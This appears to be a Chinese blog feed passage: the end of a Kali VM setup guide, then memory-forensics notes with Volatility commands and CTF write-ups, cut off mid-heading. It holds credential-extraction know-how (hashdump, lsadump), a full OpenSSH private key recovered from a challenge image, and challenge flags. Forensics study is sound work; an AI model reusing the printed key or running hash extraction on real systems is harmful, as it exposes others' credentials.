src="https://c.img.dasctf.com/images/202337/1678168820815-51115fe7-ee9b-40d3-b6dc-033378b7801c.png"><br><strong>命名虚拟机：关于虚拟机名称可根据自己喜好去改。位置选择C盘以外最好。完成之后点击下一步</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168827952-2e461dc4-bfc6-4b96-9520-e874b79d24fb.png"><br><strong>处理器配置：根据自己的需求以及电脑的硬件限制合理进行配置。完成之后继续点击下一步</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168830456-bbc07370-ddf3-48d1-b666-3cb0a76ba7da.png"><br><strong>虚拟机的内存：这里同样根据自己的需求进行分配。然后点击下一步</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168832780-cccbff47-4217-4b81-851c-898d766ba19b.png"><br><strong>网络类型：这里先选择第二项【使用网络地址转换(NAT)】，后期也可以更改，然后点击下一步</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168834888-24aa5931-ceb8-4e47-979e-1fe96f48254c.png"><br><img src="https://c.img.dasctf.com/images/202337/1678168836877-9afa55ed-9edc-478f-9453-250c9a8a8d36.png"><br><img src="https://c.img.dasctf.com/images/202337/1678168838676-ddd46e4f-5b50-4e2a-b3ae-90de39838e42.png"><br><strong>选择磁盘：这里选择创建新的虚拟磁盘，然后点击下一步</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168840577-a20dbed0-bfd5-465d-84f3-bd831b0c1bf6.png"><br><strong>指定磁盘容量：同样这里根据自己的需求按需分配，分配好之后选择最下面一项【将虚拟磁盘拆分成多个文件】，然后下一步</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168842498-b677c89a-9f2e-4188-a3da-89511b10aa84.png"><br><strong>默认点击下一步</strong><br><strong>然后</strong><br><strong>点击自定义硬件，iso为你前面下载的那个</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168844365-0b634984-f22b-4f87-90aa-7491c58af558.png"><br><strong>然后点击完成</strong></p><h3 id="这时虚拟机配置完成了，接下来就可以直接安装Kali操作系统"><a href="#这时虚拟机配置完成了，接下来就可以直接安装Kali操作系统" class="headerlink" title="这时虚拟机配置完成了，接下来就可以直接安装Kali操作系统"></a>这时虚拟机配置完成了，接下来就可以直接安装Kali操作系统</h3><p><strong>先点击【开启此虚拟机】</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168847102-2283aec2-cf33-476f-8bea-d78037429f00.png"><br><strong>点击【我已经完成安装】，将底下的黄色栏框消除</strong><br><strong>然后</strong><br><strong>选择Graphical install(图形化安装)</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168848963-f42d4344-bd2a-43f3-829b-4a3caba7a439.png"><br><strong>选择【Chinese(Simplified)-中文(简体)】，然后点击Continue</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168850369-5b7d60b0-6db5-4182-8eb0-1a43b2bf6904.png"><br><strong>选择中国然后继续</strong><br><strong>选择语言汉语然后继续</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168852085-6e7fdfbe-c9b8-4f48-a1f3-b163662a17b2.png"><br><strong>【配置网络】这里输入一个主机名，然后继续</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168853661-a2e5da3f-1d24-4f20-a184-4055ea58e8d5.png"><br>**  这里输入一个普通用户账号的用户名，然后继续**<br><strong>输入一个账号的用户名，并且记住该用户名，然后继续</strong><br><strong>为刚刚的用户设置一个密码，然后继续</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168855787-a63bbfe8-6133-44e7-b4a8-d349630ea280.png"><br><strong>磁盘分区   这里选择【向导-使用整个磁盘】，然后继续</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168857745-8d2444f8-434b-4657-b7ca-8fadee154f6c.png"><br>默认<br><img src="https://c.img.dasctf.com/images/202337/1678168859434-6944123e-1c26-4a08-952c-080adff8b911.png"><br><strong>这里分区方案选择推荐的第一个【将所有文件放在同一个分区中(推荐新手使用)】，然后继续</strong><br><strong>这里我们选择【结束分区设定并将修改写入磁盘】这个选项，然后点击继续</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168861226-1e031175-fb98-4181-be27-2c1984cd6edd.png"><br><strong>这里我们选【是】然后继续</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168863025-1efdf4dc-b431-4304-9a9c-562c9c1977e2.png"><br>下一步保持默认，直接点继续<br>然后等一会<br><img src="https://c.img.dasctf.com/images/202337/1678168865069-20ac7de0-91df-4216-a684-605647c940ab.png"><br><img src="https://c.img.dasctf.com/images/202337/1678168867377-55719e55-aef9-460d-9c0e-a84a7d64d9f5.png"><br>安装完成点击继续<br><strong>输入刚刚的用户名和密码点击登录就可以进入到桌面</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168870537-8094a301-ae18-4c80-aa9b-4e9be806c060.png"></p><h5 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h5><p>进入系统之后，右键打开终端</p><p>输入以下命令</p><p><code>sudo -i        #Linux终端命令下改变用户对命令使用权限的命令</code></p><p>然后输入登录密码，回车</p><p>然后</p><p><code>passwd root        #这条命令表示修改root用户的密码</code></p><p>输入root用户密码（新密码）</p><p>然后重复输入root密码，接着回车，注意的是输入的密码不会显示。回车</p><p><img src="https://c.img.dasctf.com/images/202337/1678187934326-ca25a2d2-1aa6-42e8-8db5-5195c0ec9d13.png"></p><p>如图所示即为成功</p><p>然后</p><p><code>sudo apt update</code>  </p><p>至此，kali安装完成</p><p>为了后续操作方便，建议继续做以下操作</p><p>更新apt以及换源：</p><p>终端输入</p><p><code>sudo vim /etc/apt/sources.list</code></p><p>输入密码进去后，按i 为输入模式</p><p>把原来的注释掉</p><p>然后粘贴下面这个上去</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">deb http:<span class="hljs-comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br>deb-src http:<span class="hljs-comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></code></pre></td></tr></table></figure><p>然后按esc，输入:wq!  回车</p><p><img src="https://c.img.dasctf.com/images/2023322/1679473195274-fa4ebc62-3181-4edd-aee3-24eb12083eb3.png"></p><p>然后</p><p><code>sudo apt update &amp;&amp; sudo apt -y full-upgrade</code></p><p>至此，更新完成</p><h3 id="如果你之前已经有kali了，那么请看下面更新操作"><a href="#如果你之前已经有kali了，那么请看下面更新操作" class="headerlink" title="如果你之前已经有kali了，那么请看下面更新操作"></a>如果你之前已经有kali了，那么请看下面更新操作</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>┌──(kali㉿kali)-[~]<br>└─$ echo <span class="hljs-string">&quot;deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware&quot;</span> | sudo tee <span class="hljs-regexp">/etc/</span>apt/sources.list<br>[...]<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo apt update &amp;&amp; sudo apt -y full-upgrade<br>[...]<br><br>┌──(kali㉿kali)-[~]<br>└─$ cp -vrbi <span class="hljs-regexp">/etc/</span>skel<span class="hljs-regexp">/. ~/</span><br>[...]<br><br>┌──(kali㉿kali)-[~]<br>└─$ [ -f <span class="hljs-regexp">/var/</span>run/reboot-required ] &amp;&amp; sudo reboot -f<br></code></pre></td></tr></table></figure><p>更新后查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>┌──(kali㉿kali)-[~]<br>└─$ grep VERSION /etc/os-release<br>VERSION=<span class="hljs-string">&quot;2023.1&quot;</span><br>VERSION_ID=<span class="hljs-string">&quot;2023.1&quot;</span><br>VERSION_CODENAME=<span class="hljs-string">&quot;kali-rolling&quot;</span><br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">uname</span> -v<br><span class="hljs-comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23)</span><br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">uname</span> -r<br>6.1.0-kali5-amd64<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存取证</title>
    <link href="/2023/02/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    <url>/2023/02/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<p>题目会持续更新（tnnd我mimikatz一直报错，所以我用了PTF：(<a href="https://blog.csdn.net/q20010619/article/details/120914205">https://blog.csdn.net/q20010619/article/details/120914205</a>)</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚接触这个板块不久，也做了几道题，这里把题合并，记录一下<br>volatility2 是python2的，volatility3是python3的，刚开始做的第一题是volatility3做的，但是做到后面题发现有些题vol3是不管用的，dump不下来文件，用vol就可以，反正kali里有py2和py3的环境，我干脆两个混着用了<br>但是个人感觉vol2的功能比较全而且稳定方便<br>最后，以下所有的内容都是我亲身经历，所有不一定所有的变量都一样，安装或者操作与我有误差还得去看看其他师傅的文章呢</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>kali更新之后环境有变化，下面的安装不一定能成功，还请自行百度（</p><h2 id="vol3"><a href="#vol3" class="headerlink" title="vol3"></a>vol3</h2><p> volatility3  下载安装：<br>kali：<br><code>git clone [https://github.com/volatilityfoundation/volatility3.git](https://github.com/volatilityfoundation/volatility3.git)</code><br>此时桌面生成一个文件夹，cd到文件夹<br><code>pip3 install -r requirements-minimal.txt</code><br><code>pip3 install -r requirements.txt</code><br>下载下面这个字符集<br><a href="https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip">https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip</a><br>然后解压后放到symbols目录下<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/1.png"><br>然后执行<br><code>python3 setup.py build </code><br><code>python3 setup.py install</code><br>然后安装环境requirements.txt报错时<br><code>sudo apt install libsnappy-dev </code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/2.png"><br>安装成功</p><h2 id="vol2"><a href="#vol2" class="headerlink" title="vol2"></a>vol2</h2><p>vol的安装就比较ez了<br><a href="https://blog.csdn.net/qq_38603541/article/details/129244112">kali下安装Volatility_kali安装volatility_烟雨天青色的博客-CSDN博客</a><br>跟着这个就行了</p><p>记得在root下安装</p><h1 id="前置姿势"><a href="#前置姿势" class="headerlink" title="前置姿势"></a>前置姿势</h1><ul><li><p>官方教程：<a href="https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html">https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html</a></p></li><li><p>PowerShell历史命令文件路径为：<code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> ，所以我们直接去filescan<code>ConsoleHost_history.txt</code></p></li><li><p>配合grep命令检索关键字</p></li><li><p>配合strings转换</p></li><li><p>一些文件修复姿势，遇到时百度</p><h2 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h2></li><li><p>vol3要在root用户下运行，不然可能会报错，我就是报错了，重装了还是一样，后来在root运行就可以了</p></li><li><p>vol2最好在根目录运行，我在桌面运行所有命令回显的都是info信息</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="vol3-1"><a href="#vol3-1" class="headerlink" title="vol3"></a>vol3</h3><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><br><br>常用插件：<br>layerwriter：列出内存镜像<span class="hljs-keyword">platform</span>信息<br>linux.bash：从内存中恢复bash命令历史记录<br>linux.check_afinfo：验证网络协议的操作功能指针<br>linux.check_syscall：检查系统调用表中的挂钩<br>linux.elfs：列出所有进程的所有内存映射ELF文件<br>linux.lsmod：列出加载的内核模块<br>linux.lsof：列出所有进程的所有内存映射<br>linux.malfind：列出可能包含注入代码的进程内存范围<br>linux.<span class="hljs-keyword">proc</span>：列出所有进程的所有内存映射<br>linux.pslist：列出linux内存映像中存在的进程<br>linux.pstree：列出进程树<br>mac.bash：从内存中恢复bash命令历史记录<br>mac.check_syscall：检查系统调用表中的挂钩<br>mac.check_sysctl：检查sysctl处理程序的挂钩<br>mac.check_trap_table：检查trap表中的挂钩<br>mac.ifconfig：列出网卡信息<br>mac.lsmod：列出加载的内核模块<br>mac.lsof：列出所有进程的所有内存映射<br>mac.malfind：列出可能包含注入代码的进程内存范围<br>mac.netstat：列出所有进程的所有网络连接<br>mac.psaux：恢复程序命令行参数<br>mac.pslist：列出linux内存映像中存在的进程<br>mac.pstree：列出进程树<br>mac.tasks：列出Mac内存映像中存在的进程<br>windows.<span class="hljs-keyword">info</span>：显示正在分析的内存样本的OS和内核详细信息<br>windows.callbacks：列出内核回调和通知例程<br>windows.cmdline：列出进程命令行参数<br>windows.dlldump：将进程内存范围DLL转储<br>windows.dlllist：列出Windows内存映像中已加载的dll模块<br>windows.driverirp：在Windows内存映像中列出驱动程序的IRP<br>windows.driverscan：扫描Windows内存映像中存在的驱动程序<br>windows.filescan：扫描Windows内存映像中存在的文件对象<br>windows.handles：列出进程打开的句柄<br>windows.malfind：列出可能包含注入代码的进程内存范围<br>windows.moddump：转储内核模块<br>windows.modscan：扫描Windows内存映像中存在的模块<br>windows.mutantscan：扫描Windows内存映像中存在的互斥锁<br>windows.pslist：列出Windows内存映像中存在的进程<br>windows.psscan：扫描Windows内存映像中存在的进程<br>windows.pstree：列出进程树<br>windows.procdump：转储处理可执行映像<br>windows.<span class="hljs-keyword">registry</span>.certificates：列出注册表中存储的证书<br>windows.<span class="hljs-keyword">registry</span>.hivelist：列出内存映像中存在的注册表配置单元<br>windows.<span class="hljs-keyword">registry</span>.hivescan：扫描Windows内存映像中存在的注册表配置单元<br>windows.<span class="hljs-keyword">registry</span>.printkey：在配置单元或特定键值下列出注册表项<br>windows.<span class="hljs-keyword">registry</span>.userassist：打印用户助手注册表项和信息<br>windows.ssdt：列出系统调用表<br>windows.strings：读取字符串命令的输出，并指示每个字符串属于哪个进程<br>windows.svcscan：扫描Windows服务<br>windows.symlinkscan：扫描Windows内存映像中存在的链接<br></code></pre></td></tr></table></figure></li></ul><h3 id="vol2-1"><a href="#vol2-1" class="headerlink" title="vol2"></a>vol2</h3><p>vol要<code>--profile</code>指定版本，所以这里的命令就统一了</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stylus">volatility <span class="hljs-selector-attr">[plugin]</span> -f <span class="hljs-selector-attr">[image]</span> <span class="hljs-attr">--profile</span>=<span class="hljs-selector-attr">[profile]</span><br> <br>常用插件：<br>    imageinfo：显示目标镜像的摘要信息<br>    pslist：列举出系统进程，但它不能检测到隐藏或者解链的进程<br>    psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程<br>    pstree：以树的形式查看进程列表，和pslist一样，也无法检测隐藏或解链的进程<br>    mendump：转储指定进程数据，常用foremost来分离里面的文件<br>    filescan：扫描所有的文件列表<br>    dumpfiles：转储文件<br>    svcscan：扫描 Windows 的服务<br>    connscan：查看网络连接<br>    hivelist：打印注册表列表<br>    hivedump：转储注册表信息<br>    printkey：打印注册表项、子项和值<br>    screenshot：Windows截图<br>    hashdump：查看当前操作系统中的password hash，例如Windows的NTLM hash<br>iehistory：查看ie浏览器记录<br>lsadump：从注册表获取用户哈希的部分<br></code></pre></td></tr></table></figure><p><strong>命令太多，可以–info来查看所有可以用的插件</strong></p><h1 id="一些题目wp"><a href="#一些题目wp" class="headerlink" title="一些题目wp"></a>一些题目wp</h1><h2 id="羊城杯-2021-Baby-Forenisc"><a href="#羊城杯-2021-Baby-Forenisc" class="headerlink" title="[羊城杯 2021]Baby_Forenisc"></a>[羊城杯 2021]Baby_Forenisc</h2><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/3.png"><br>这里有一个小坑，要在根目录运行命令，我在桌面运行所有命令回显的都是info信息<br><code>volatility -f /home/kali/桌面/BIODOG-7711E93C-20210908-053022.raw --profile=WinXPSP2x86 iehistory</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/4.png"><br>找ssh文件<br><code>volatility -f /home/kali/桌面/BIODOG-7711E93C-20210908-053022.raw --profile=WinXPSP2x86 filescan |grep &#39;ssh.txt&#39;</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/5.png"><br>dump下来<br><code>volatility -f /home/kali/桌面/BIODOG-7711E93C-20210908-053022.raw --profile=WinXPSP2x86 dumpfiles -Q 0x00000000020bf6a0 -D /home/kali/桌面</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs awk">-----<span class="hljs-keyword">BEGIN</span> OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAmw8eqi/h23ABuRhhmx83LuRhw6m8C8k76Me0s7MNdvDP2ZB5hJUU<br>fZ4HxR5sEoQf6NyIcCDeznb8FAYAktm3cBlgof847aL661F0R5FtIfOJC/MwklRmXjYr46<br><span class="hljs-number">6</span>HNjQ0Ouu12znqBPJAaMkAaZXknqlEAxCRvyOQhg0bPSR3xxCM39TxpXRKd3tzhlBUQHZi<br>upgt6CF3TkBuIcKUPgZ7OgJ<span class="hljs-regexp">/7ES3FaiUOlpZdUYf/</span>H3VwwQumuXPPwvT5QdRA9Myv/zbee<br>R9ddLJL84raHK6unuHjngGvWjhXUUQulta49HH55pyrFUViIvH1tfns/<span class="hljs-number">6</span>BglTrYWRlFX3A<br>TNOVy2igHkhZI8M9GK5VUBwEo3kXcWRiK85vAWwmddBd9+c0NERahRg+SNbodsd1JFu0C9<br>kqJ8<span class="hljs-regexp">/HlOnDfPBsUpD0EY/</span>EbzW5PKbkksp2Vp3z+S0y1aVpX2EJRhq2S5kEEU+V4LLN6uqu<br>CJzVLeG5Lpnn4V<span class="hljs-regexp">/Ekf/</span>ZpJmmk1Pp9KGFw3tlOqTLAAAFkNMuPgLTLj4CAAAAB3NzaC1yc2<br>EAAAGBAJsPHqov4dtwAbkYYZsfNy7kYcOpvAvJO+jHtLOzDXbwz9mQeYSVFH2eB8UebBKE<br>H+jciHAg3s52<span class="hljs-regexp">/BQGAJLZt3AZYKH/</span>OO2i+utRdEeRbSHziQvzMJJUZl42K+OuhzY0NDrrtd<br>s56gTyQGjJAGmV5J6pRAMQkb8jkIYNGz0kd8cQjN/U8aV0Snd7c4ZQVEB2YrqYLeghd05A<br>biHClD4GezoCf+xEtxWolDpaWXVGH<span class="hljs-regexp">/x91cMELprlzz8L0+UHUQPTMr/</span><span class="hljs-number">823</span>nkfXXSyS/OK2<br>hyurp7h454Br1o4V1FELpbWuPRx+eacqxVFYiLx9bX57P+gYJU62FkZRV9wEzTlctooB5I<br>WSPDPRiuVVAcBKN5F3FkYivObwFsJnXQXffnNDREWoUYPkjW6HbHdSRbtAvZKifPx5Tpw3<br>zwbFKQ9BGPxG81uTym5JLKdlad8/ktMtWlaV9hCUYatkuZBBFPleCyzerqrgic1S3huS6Z<br><span class="hljs-number">5</span>+FfxJH/<span class="hljs-number">2</span>aSZppNT6fShhcN7ZTqkywAAAAMBAAEAAAGAdfojEsorxpKKPRLX8PbnPb52xD<br>C46x7Jfmu0iaWKcRz4iEjsrHvhg1JiBxEGmW/<span class="hljs-number">992</span>cUSHw6Ck1trq6CcTlF4PzuEVPnNKf0<br><span class="hljs-number">0</span>ma<span class="hljs-regexp">/WlTD/</span>DkX5Qe7xRqCaNw+uJVqO0utEceWLp7595l6eD+<span class="hljs-number">3</span>GJ77u9x96vcIba3ZoKUIPJ<br>UqrUNibEvRMFoy7oX3eBJWiFWK+P4gr6YG6HsNUJKDyE2WJKUSP+pogwoo<span class="hljs-regexp">/d0Qg7I/</span>VBVK<br>N39PFnwUG5wcNP5EHezqWQVVln<span class="hljs-regexp">/dltDgOc5IldknTRt4Q3NDrSyNsRpv0EYI2gz+yRu/</span>IE<br>RR9PHYjH5l6uYwowW34iGi<span class="hljs-regexp">/xloSxG5bDEWOe0eEANCjowiYYrmTLffIQ/</span>AU9w4te/+eWd2<br>WV56LUuC6k4mEdNhtljMZR/<span class="hljs-number">0</span>A+C5EkPzgsTEJEmYLYvqrNejM7Y1UKz3+YZ8m8rT4XcNmf<br>j5wfJd1TbCu0hB5kZC1DkybYQaMRNnZ3+PjwU2hZBTuh02F787nG5NFkpI96qkWxTBAAAA<br>wBdaxLNzl<span class="hljs-regexp">/7Dig/</span>neTUAQLa<span class="hljs-regexp">/C1F2cpQt6RcJbzHodgxm8n75a/</span>wdRI4/oCvGJkRgyAnyCE<br>tgfMnTQ4opmHf5k0U0R/wmCGivcGhg5KIBSSnp9mWt6qclJ8O6vZ5L3rKIgreWzGUDk8IT<br>W3Lcl5EO0sskpVvp65xncEdv3CefxXVTlkgp4PXgXcxPao633hWA6TAm2zZx7R6fJt0Ex4<br>x3lVG68ghRE/ZFbF48s8Gy+zRDyA5JEGPWxWddO623IVgG6AAAAMEAyX4CJKSxE5gvJdrw<br>lhx8dBbVQxw06fPoVlu<span class="hljs-regexp">/z/</span>JTwkPdliuAdp30SV8WbmXUhLvv457WdqAMCwlGs/<span class="hljs-number">7</span>xrCW21U<br><span class="hljs-number">84</span>+VeD9aGM61nSsT7kUzGjdvbjQiHCmys7dwuy/thCrpWFTxI4fjOEYHc3N8S+hBHQRJKk<br>mEYyBoI3eJ3NhUsGHr1V4LONBKkoUZyC+LjKev06m9qM6R0/<span class="hljs-number">0</span>k4cB09pkDVinuFuGk5iDy<br>YKyjAGiAxFI9ACiZ5NLKTsdaEqtCPfAAAAwQDFAXbSxwbLYWDacBNUm4E7FZsYKkqoIAWQ<br><span class="hljs-number">3</span>uEQP5Sp7GrCU5dWraGB2wOkX+irMYGDfTk5qG8NLyYoSKVIZwA6ijDliWekL6XdPGJfKK<br><span class="hljs-number">7</span>xw64Nx6syc7oD7scSzTGNH0m1z+T2rjP3dMDDVhYMHksYcSxikyHNzLR9Z51hCOHeKb1O<br><span class="hljs-number">8</span>LNW4IrC6AYeXt8sHizSLIagncOuPtSkKiGdR5fn65fHomMzaVQsSJYvwNeSrKXu36NSJm<br><span class="hljs-number">27</span>AuL6DDE2vJUAAAAUc29uZzU1MjA4NTEwN0BxcS5jb20BAgMEBQYH<br>-----<span class="hljs-keyword">END</span> OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>解base64后<br><code>song552085107@qq.com</code><br>在Github上搜索此用户，找到关键项目：<br><a href="https://github.com/Ha1f00L/whatsthat">https://github.com/Ha1f00L/whatsthat</a><br>访问后下载项目中的__APP__，在其中可以找到：<br>U2FuZ0ZvcntTMF8zYXp5XzJfY3JhY2tfbm9vYl9wbGF5ZXJ9<br>base64解码后就得到了flag  ：<code>SangFor&#123;S0_3azy_2_crack_noob_player&#125;</code></p><h2 id="hgame2022week4"><a href="#hgame2022week4" class="headerlink" title="hgame2022week4"></a>hgame2022week4</h2><h3 id="ezWin-variables"><a href="#ezWin-variables" class="headerlink" title="ezWin - variables"></a>ezWin - variables</h3><p>题目这个<code>variables</code>是啥变量，猜测是环境变量<br>使用命令<br><code>python3 vol.py -f /home/kali/桌面/win10_22h2_19045.2486.vmem envars</code><br>翻找到一个环境变量<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/6.png"></p><h3 id="ezWin-7zip"><a href="#ezWin-7zip" class="headerlink" title="ezWin - 7zip"></a>ezWin - 7zip</h3><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/7.png"><br><code>python3 vol.py -f /home/kali/桌面/win10_22h2_19045.2486.vmem filescan &gt; 1.txt</code><br>查看文件<br>打开1.txt检索flag发现存在flag.7z文件<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/8.png"><br>提取这个文件<br><code>python3 vol.py -f ../win10_22h2_19045.2486.vmem dumpfiles --virtaddr 0xd0064181c950 </code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/9.png"><br>得到<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/10.png"><br>发现需要密码<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/11.png"><code>![](/wp/内存取证/12.png) 文件名给了提示 nt_hash 是Ntlm hash 里面有用户名和密码 `python3 vol.py -f ../win10_22h2_19045.2486.vmem windows.hashdump ` 这里一开始尝试的时候报错了 ![](/wp/内存取证/13.png) 原因是pip安装不了snappy-dev库 前面安装环境的时候` pip3 install -r requirements.txt `报错</code><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/14.png"><br>然后就跑出账号密码了<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/15.png"><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/16.png"><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/17.png"><br><code>hgame&#123;e30b6984-615c-4d26-b0c4-f455fa7202e2&#125;</code></p><h3 id="ezWin-auth"><a href="#ezWin-auth" class="headerlink" title="ezWin - auth"></a>ezWin - auth</h3><p><code>python3 vol.py -f ../win10_22h2_19045.2486.vmem windows.cmdline</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/18.png"><br>一开始没啥思路，就先做了第3题，没想到这题flag是下一题的key<br><code>python3 vol.py -f ../win10_22h2_19045.2486.vmem windows.hashdump</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/19.png"><br><code>hgame&#123;84b0d9c9f830238933e7131d60ac6436&#125;</code></p><h2 id="Byte-Bandits-CTF-2023"><a href="#Byte-Bandits-CTF-2023" class="headerlink" title="Byte Bandits CTF 2023"></a>Byte Bandits CTF 2023</h2><p>这里比赛的时候队友已经做了，我就直接偷wp，不自己写了</p><h3 id="Memory-Dump"><a href="#Memory-Dump" class="headerlink" title="Memory Dump"></a>Memory Dump</h3><p>题目说明：<br>I was learning powershell when my pc suddenly crashed. Can you retrieve my bash history?</p><h4 id="法一"><a href="#法一" class="headerlink" 